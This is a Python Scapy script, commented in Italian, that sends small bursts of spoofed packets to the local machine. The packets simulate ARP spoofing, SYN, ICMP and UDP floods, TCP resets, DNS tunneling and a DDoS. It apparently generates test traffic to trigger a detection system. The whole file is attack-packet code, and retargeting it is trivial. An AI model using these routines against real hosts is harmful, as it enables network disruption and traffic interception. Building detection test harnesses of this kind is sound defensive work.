from scapy.all import ARP, IP, TCP, UDP, ICMP, DNS, DNSQR, Ether, Raw, sendp
from scapy.all import *
import time
import socket

# --- Funzioni di utilità ---
def get_local_ip():
    """Rileva l'IP locale della macchina in uso"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))  # non manda traffico reale
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

def get_local_mac():
    """Rileva il MAC della scheda usata da Scapy"""
    try:
        return get_if_hwaddr(conf.iface)
    except Exception:
        return "00:00:00:00:00:00"

TARGET_IP = get_local_ip()   # IP target
TARGET_MAC = get_local_mac() #"e8:d0:fc:de:97:27"  # MAC legittimo del target
SRC_IP = "192.168.1.200"      # IP “spoofato”
SRC_MAC = "00:11:22:33:44:55" # MAC sorgente “spoofata”

# --- ARP Spoofing ---
def demo_arp_spoof():
    print("[DEMO] ARP Spoofing...")
    print(get_local_ip())
    print(get_local_mac())
    print(conf.iface)
    # 1) invia MAC legittimo per inizializzare arp_table
    pkt_legit = Ether(src=TARGET_MAC, dst=TARGET_MAC)/ARP(op=2, psrc=TARGET_IP, pdst=TARGET_IP, hwsrc=TARGET_MAC)
    sendp(pkt_legit, verbose=False)
    time.sleep(0.5)
    # 2) invia MAC falso per triggerare alert
    pkt_spoof = Ether(src=SRC_MAC, dst=TARGET_MAC)/ARP(op=2, psrc=TARGET_IP, pdst=TARGET_IP, hwsrc=SRC_MAC)
    sendp(pkt_spoof, verbose=False)
    print(f"[DEMO] ARP Spoofing inviato verso {TARGET_IP} ({SRC_MAC})")
    print("[DEMO] Attacco completato!")

# --- SYN Flood ---
def demo_syn_flood():
    print("[DEMO] SYN Flood...")
    for i in range(60):
        pkt = Ether(src=SRC_MAC, dst=TARGET_MAC)/IP(src=SRC_IP, dst=TARGET_IP)/TCP(sport=1234+i, dport=80, flags="S")
        sendp(pkt, verbose=False)
        time.sleep(0.05)
    print("[DEMO] Attacco completato!")

# --- ICMP Flood ---
def demo_icmp_flood():
    print("[DEMO] ICMP Flood...")
    for i in range(15):
        pkt = Ether(src=SRC_MAC, dst=TARGET_MAC)/IP(src=SRC_IP, dst=TARGET_IP)/ICMP(type=8)
        sendp(pkt, verbose=False)
        time.sleep(0.05)
    print("[DEMO] Attacco completato!")

# --- TCP Reset Attack ---
def demo_tcp_reset():
    print("[DEMO] TCP Reset Attack...")
    for i in range(25):
        pkt = Ether(src=SRC_MAC, dst=TARGET_MAC)/IP(src=SRC_IP, dst=TARGET_IP)/TCP(sport=1234+i, dport=80, flags="R")
        sendp(pkt, verbose=False)
        time.sleep(0.05)
    print("[DEMO] Attacco completato!")

# --- UDP Amplification ---
def demo_udp_amplification():
    print("[DEMO] UDP Amplification...")
    sizes = [30, 40, 150]
    for size in sizes:
        payload = b"A"*size
        pkt = Ether(src=SRC_MAC, dst=TARGET_MAC)/IP(src=SRC_IP, dst=TARGET_IP)/UDP(sport=1234, dport=1234)/Raw(load=payload)
        sendp(pkt, verbose=False)
        time.sleep(0.05)
    print("[DEMO] Attacco completato!")

# --- DNS Tunneling ---
def demo_dns_tunneling():
    print("[DEMO] DNS Tunneling...")
    long_query = "verylongsubdomainname.example.com"
    for i in range(35):
        pkt = Ether(src=SRC_MAC, dst=TARGET_MAC)/IP(src=SRC_IP, dst=TARGET_IP)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=long_query))
        sendp(pkt, verbose=False)
        time.sleep(0.05)
    print("[DEMO] Attacco completato!")

# --- DDoS Simulation ---
def demo_ddos():
    print("[DEMO] DDoS Simulation...")
    for i in range(35):
        src_ip = f"192.168.2.{i}"
        pkt = Ether(src=SRC_MAC, dst=TARGET_MAC)/IP(src=src_ip, dst=TARGET_IP)/TCP(dport=80, flags="S")
        sendp(pkt, verbose=False)
        time.sleep(0.05)
    print("[DEMO] Attacco completato!")

# --- Mappatura attacchi ---
ATTACKS = {
    "arp": demo_arp_spoof,
    "syn": demo_syn_flood,
    "icmp": demo_icmp_flood,
    "tcpreset": demo_tcp_reset,
    "udp": demo_udp_amplification,
    "dns": demo_dns_tunneling,
    "ddos": demo_ddos,
    "all": lambda: [func() for func in ATTACKS.values() if func != ATTACKS["all"]]
}

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Demo attacchi rete")
    parser.add_argument(
        "attack",
        choices=ATTACKS.keys(),
        help="Scegli quale attacco lanciare"
    )
    args = parser.parse_args()
    ATTACKS[args.attack]()


